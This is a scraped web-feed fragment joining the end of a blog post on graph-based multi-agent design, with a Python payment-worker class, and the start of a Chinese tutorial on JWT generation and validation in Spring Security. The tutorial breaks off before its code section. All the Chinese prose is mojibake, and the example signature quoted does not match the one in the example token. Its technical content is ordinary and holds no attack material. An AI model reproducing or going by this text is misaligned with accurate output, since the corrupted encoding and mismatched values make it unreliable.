<h2 data-id="heading-4"><strong>Workerå’Œå·¥å…·</strong></h2>
<p>Workeræ™ºèƒ½ä½“æ˜¯å®é™…å·¥ä½œå‘ç”Ÿçš„åœ°æ–¹ã€‚æ¯ä¸ªworkeréƒ½å¯ä»¥è®¿é—®ä¸€ç»„ç‹­çª„çš„å·¥å…·ï¼Œå¹¶ä¸“æ³¨äºä¸€ä¸ªç‰¹å®šçš„é¢†åŸŸã€‚ä¸€ä¸ªå¯èƒ½å¤„ç†æ”¯ä»˜æŸ¥è¯¢ï¼Œå¦ä¸€ä¸ªå¤„ç†äº‰è®®å¤‡æ¡ˆï¼Œç¬¬ä¸‰ä¸ªè¿è¡Œåˆ†ææŸ¥è¯¢ã€‚</p>
<p>ç”±äºworkerçš„èŒƒå›´å¾ˆçª„ï¼Œå®ƒä»¬æ›´å®¹æ˜“æµ‹è¯•ã€æ›´å®¹æ˜“ç†è§£ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚æ·»åŠ æ–°åŠŸèƒ½æ„å‘³ç€æ·»åŠ æ–°çš„workerèŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯é‡æ„æ•´ä¸ªç³»ç»Ÿã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentWorker</span>:
	<span class="hljs-string">"""Handles payment-related queries only"""</span>
	
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, tools: <span class="hljs-type">List</span>[Tool]</span>):
    	self.tools = {
        	<span class="hljs-string">"lookup"</span>: PaymentLookupTool(),
        	<span class="hljs-string">"stats"</span>: PaymentStatsTool(),
        	<span class="hljs-string">"export"</span>: PaymentExportTool()
    	}
	
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, context: Context</span>):
    	<span class="hljs-comment"># Single responsibility: payment lookups only</span>
    	tool_name = self._select_tool(query)
    	tool = self.tools[tool_name]
    	
        <span class="hljs-comment"># Execute with merchant-specific context</span>
    	result = <span class="hljs-keyword">await</span> tool.execute(
        	query=query,
        	merchant_id=context.merchant_id,
        	filters=self._extract_filters(query)
    	)
    	
        <span class="hljs-keyword">return</span> self._format_response(result)
	
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_select_tool</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    	<span class="hljs-string">"""Simple keyword matching for tool selection"""</span>
    	<span class="hljs-keyword">if</span> <span class="hljs-string">"export"</span> <span class="hljs-keyword">in</span> query.lower():
        	<span class="hljs-keyword">return</span> <span class="hljs-string">"export"</span>
    	<span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> query.lower() <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">"total"</span>, <span class="hljs-string">"sum"</span>, <span class="hljs-string">"count"</span>]):
        	<span class="hljs-keyword">return</span> <span class="hljs-string">"stats"</span>
    	<span class="hljs-keyword">else</span>:
        	<span class="hljs-keyword">return</span> <span class="hljs-string">"lookup"</span>
</code></pre>
<h2 data-id="heading-5"><strong>ä¸ºä»€ä¹ˆè¿™ç§æ¶æ„æœ‰æ•ˆ</strong></h2>
<p>å½“æˆ‘ä»¬è½¬å‘è¿™ç§æ¨¡å‹æ—¶ï¼Œä»¥ä¸‹å‡ ç‚¹ç«‹å³å¾—åˆ°äº†æ”¹å–„ï¼š</p>
<ul>
<li><strong>å¯ç»´æŠ¤æ€§ï¼š</strong> æ¯ä¸ªç»„ä»¶éƒ½æœ‰å•ä¸€çš„èŒè´£ã€‚å¦‚æœå‡ºç°é—®é¢˜ï¼Œæˆ‘ä»¬ç¡®åˆ‡çŸ¥é“åœ¨å“ªé‡ŒæŸ¥æ‰¾ã€‚</li>
<li><strong>å¯æ‰©å±•æ€§ï¼š</strong> æ–°åŠŸèƒ½ä¸éœ€è¦é‡å†™æ ¸å¿ƒé€»è¾‘ã€‚æˆ‘ä»¬æ·»åŠ çš„æ˜¯èŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯å¤æ‚æ€§ã€‚</li>
<li><strong>å¯æµ‹è¯•æ€§ï¼š</strong> åœ¨å°†æ¯ä¸ªworkeré›†æˆåˆ°æ›´å¤§çš„å›¾ä¸­ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥ç‹¬ç«‹æµ‹è¯•å®ƒä»¬ã€‚</li>
<li><strong>ä¸Šä¸‹æ–‡ç®¡ç†ï¼š</strong> ç”±äºçŠ¶æ€é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„å›¾ç»“æ„æµåŠ¨ï¼Œæˆ‘ä»¬é¿å…äº†å›°æ‰°æˆ‘ä»¬æœ€åˆå°è¯•çš„â€œä¸‡ç‰©äº’è”â€é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-6"><strong>ä¹‹å‰ï¼šå•ä½“æ–¹æ³•</strong></h3>
<p><img src="https://cdn.thenewstack.io/media/2026/01/6b9ad901-screenshot-2026-01-09-at-9.25.45-am-1024x581.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-7"><strong>ä¹‹åï¼šåŸºäºå›¾çš„æ–¹æ³•</strong></h3>
<p><img src="https://cdn.thenewstack.io/media/2026/01/fd83aad6-screenshot-2026-01-09-at-9.26.09-am-1024x436.png" alt="" loading="lazy"/></p>
<p>è¿™ä¸æ˜¯å°†äººå·¥æ™ºèƒ½åº”ç”¨äºé—®é¢˜å¹¶æœŸæœ›å®ƒèƒ½å¥æ•ˆã€‚è¿™æ˜¯å…³äºæ„å»ºå°Šé‡çœŸå®ç»„ç»‡å¤æ‚æ€§ï¼ŒåŒæ—¶åœ¨å¢é•¿è¿‡ç¨‹ä¸­ä¿æŒå¯ç»´æŠ¤æ€§çš„ç³»ç»Ÿã€‚</p>
<p>åŸºäºå›¾çš„æ–¹æ³•ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›ä»¥å‰æ²¡æœ‰çš„ä¸œè¥¿ï¼šä¸€ç§åè°ƒå¤šä¸ªä¸“ä¸šæ™ºèƒ½ä½“çš„æ–¹æ³•ï¼Œè€Œä¸ä¼šäº§ç”Ÿæ··ä¹±çš„æ¡ä»¶å’Œè¿‡è½½çš„æç¤ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringSecurityå…¥é—¨ç¯‡(3)ï¼šJWTçš„ç”Ÿæˆã€å­˜å‚¨ä¸éªŒè¯]]></title>    <link>https://juejin.cn/post/7597989474971090994</link>    <guid>https://juejin.cn/post/7597989474971090994</guid>    <pubDate>2026-01-22T03:05:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597989474971090994" data-draft-id="7596170399881887796" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringSecurityå…¥é—¨ç¯‡(3)ï¼šJWTçš„ç”Ÿæˆã€å­˜å‚¨ä¸éªŒè¯"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-22T03:05:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŠ æ´›æ–¯"/> <meta itemprop="url" content="https://juejin.cn/user/1084596182848299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringSecurityå…¥é—¨ç¯‡(3)ï¼šJWTçš„ç”Ÿæˆã€å­˜å‚¨ä¸éªŒè¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1084596182848299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŠ æ´›æ–¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T03:05:57.000Z" title="Thu Jan 22 2026 03:05:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åŠ æ´›æ–¯ï¼Œæ˜¯ä¸€åå…¨æ ˆå·¥ç¨‹å¸ˆğŸ‘¨â€ğŸ’»ï¼Œè¿™é‡Œæ˜¯æˆ‘çš„çŸ¥è¯†ç¬”è®°ä¸åˆ†äº«ï¼Œæ—¨åœ¨æŠŠå¤æ‚çš„ä¸œè¥¿è®²æ˜ç™½ã€‚å¦‚æœå‘ç°æœ‰è¯¯ğŸ”ï¼Œä¸‡åˆ†æ¬¢è¿ä½ å¸®æˆ‘æŒ‡å‡ºæ¥ï¼åºŸè¯ä¸å¤šè¯´ï¼Œæ­£æ–‡å¼€å§‹ ğŸ‘‡</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€åŸºç¡€æ¦‚å¿µ</h2>
<h3 data-id="heading-1">1.1 ä»€ä¹ˆæ˜¯JWTï¼Ÿ</h3>
<p><strong>JWT</strong>ï¼Œå…¨ç§°æ˜¯<code>JSON Web Token</code>æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼ˆ<code>RFC 7519</code>ï¼‰ï¼Œå®ƒç”¨äºåœ¨å„æ–¹ä¹‹é—´ä½œä¸º<code>JSON</code>å¯¹è±¡å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚ä¹Ÿé€šå¸¸ç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒã€‚</p>
<h3 data-id="heading-2">1.2 ä¸ºä»€ä¹ˆè¦ç”¨JWTï¼Ÿ</h3>
<ul>
<li><strong>æœåŠ¡å™¨ä¸éœ€è¦å­˜å‚¨ä¼šè¯ä¿¡æ¯</strong>ï¼šä¼ ç»Ÿçš„sessionéœ€è¦åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨ä¼šè¯æ•°æ®ï¼Œè€ŒJWTå°†æ‰€æœ‰å¿…è¦ä¿¡æ¯åŒ…å«åœ¨tokenä¸­</li>
<li><strong>æ˜“äºæ°´å¹³æ‰©å±•</strong>ï¼šä¸éœ€è¦ä¼šè¯å¤åˆ¶æˆ–å…±äº«å­˜å‚¨ï¼Œé€‚åˆåˆ†å¸ƒå¼ç³»ç»Ÿå’Œå¾®æœåŠ¡æ¶æ„</li>
</ul>



































<table><thead><tr><th>ç‰¹æ€§</th><th>JWT</th><th>ä¼ ç»ŸSession</th></tr></thead><tbody><tr><td>çŠ¶æ€</td><td>æ— çŠ¶æ€</td><td>æœ‰çŠ¶æ€</td></tr><tr><td>å­˜å‚¨</td><td>Tokenè‡ªåŒ…å«</td><td>æœåŠ¡å™¨å­˜å‚¨</td></tr><tr><td>æ‰©å±•æ€§</td><td>å®¹æ˜“æ‰©å±•</td><td>éœ€è¦ä¼šè¯å…±äº«</td></tr><tr><td>è·¨åŸŸ</td><td>åŸç”Ÿæ”¯æŒ</td><td>éœ€è¦é¢å¤–é…ç½®</td></tr><tr><td>æ€§èƒ½</td><td>å‡å°‘æ•°æ®åº“æŸ¥è¯¢</td><td>æ¯æ¬¡éªŒè¯éœ€æŸ¥åº“</td></tr></tbody></table>
<h3 data-id="heading-3">1.3 JWTçš„ç»“æ„</h3>
<p>JWT ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç”¨ç‚¹å·åˆ†éš”ï¼š</p>
<pre><code class="hljs language-text" lang="text">xxxxx.yyyyy.zzzzz
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30
</code></pre>
<h4 data-id="heading-4">1.3.1 Header</h4>
<p><strong>Header</strong>ï¼ˆå¤´éƒ¨ï¼‰åŒ…å«ä»¤ç‰Œç±»å‹å’Œç­¾åç®—æ³•ï¼ŒJWTçš„å¤´éƒ¨é€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li><strong>typ</strong>ï¼šä»¤ç‰Œç±»å‹ï¼Œå›ºå®šä¸º"JWT"</li>
<li><strong>alg</strong>ï¼šç­¾åç®—æ³•ï¼Œå¦‚HS256ã€RS256ç­‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šBase64ç¼–ç å‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"alg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HS256"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"typ"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JWT"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>Base64ç¼–ç åï¼š</strong> Â <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></p>
<h4 data-id="heading-5">1.3.2 Payload</h4>
<p><strong>Payload</strong>ï¼ˆè´Ÿè½½ï¼‰ï¼šåŒ…å«å£°æ˜ï¼Œå³è¦ä¼ è¾“çš„æ•°æ®ï¼Œå®ƒæœ‰ä¸‰ç§ç±»å‹çš„å£°æ˜ï¼š</p>
<ol>
<li><strong>æ ‡å‡†å£°æ˜ï¼ˆå»ºè®®ä½†ä¸å¼ºåˆ¶ï¼‰ï¼š</strong></li>
</ol>
<ul>
<li><strong>iss</strong>Â (issuer)ï¼šç­¾å‘è€…</li>
<li><strong>sub</strong>Â (subject)ï¼šä¸»é¢˜</li>
<li><strong>aud</strong>Â (audience)ï¼šæ¥æ”¶æ–¹</li>
<li><strong>exp</strong>Â (expiration time)ï¼šè¿‡æœŸæ—¶é—´</li>
<li><strong>nbf</strong>Â (not before)ï¼šç”Ÿæ•ˆæ—¶é—´</li>
<li><strong>iat</strong>Â (issued at)ï¼šç­¾å‘æ—¶é—´</li>
<li><strong>jti</strong>Â (JWT ID)ï¼šå”¯ä¸€æ ‡è¯†</li>
</ul>
<ol start="2">
<li><strong>å…¬å…±å£°æ˜</strong></li>
</ol>
<p>å¯ä»¥å®šä¹‰å…¬å¼€çš„å£°æ˜ï¼Œä½†åº”é¿å…å†²çª</p>
<ol start="3">
<li><strong>ç§æœ‰å£°æ˜</strong></li>
</ol>
<p>è‡ªå®šä¹‰çš„ä¸šåŠ¡æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ä½¿ç”¨å®˜æ–¹å®šä¹‰çš„ä»»ä½•å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•å­—æ®µæ¥ä¼ è¾“æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šBase64ç¼–ç å‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"sub"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1234567890"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"John Doe"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"admin"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"iat"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1516239022</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>Base64ç¼–ç åï¼š</strong> Â <code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0</code></p>
<h4 data-id="heading-6">1.3.3 Signature</h4>
<p><strong>Signature</strong>ï¼šéªŒè¯ä»¤ç‰Œå®Œæ•´æ€§çš„ç­¾åï¼Œç”¨äºéªŒè¯æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</p>
<p>é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨æ‰çŸ¥é“ï¼Œä¸èƒ½æ³„éœ²ç»™ç”¨æˆ·ï¼Œç„¶åï¼Œä½¿ç”¨Headeré‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•(é»˜è®¤æ˜¯HMACSHA256),æŒ‰ç…§ä¸‹é¢çš„å…¬å¼äº§ç”Ÿç­¾åï¼š</p>
<pre><code class="hljs language-text" lang="text">HMACSHA256(
  base64UrlEncode(header) + "." + 
  base64UrlEncode(payload),
  secret
)
</code></pre>
<p><strong>ç¤ºä¾‹ç­¾åï¼š</strong> Â <code>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></p>
<h2 data-id="heading-7">äºŒã€ç”ŸæˆJWT</h2>
<p>æˆ‘ä»¬æœ‰å¾ˆå¤šçš„å·¥å…·å¯ä»¥å¸®æˆ‘ä»¬ç”Ÿæˆ<code>JWT</code>ï¼Œæˆ‘ä»¬åªéœ€è¦ç®€å•é…ç½®ä¸€ä¸‹å°±èƒ½ä½¿ç”¨ï¼Œæœ¬ç« è®²è¿°ç¬¬ä¸€ä¸ªå·¥å…·<code>java-jwt</code>ã€‚</p>
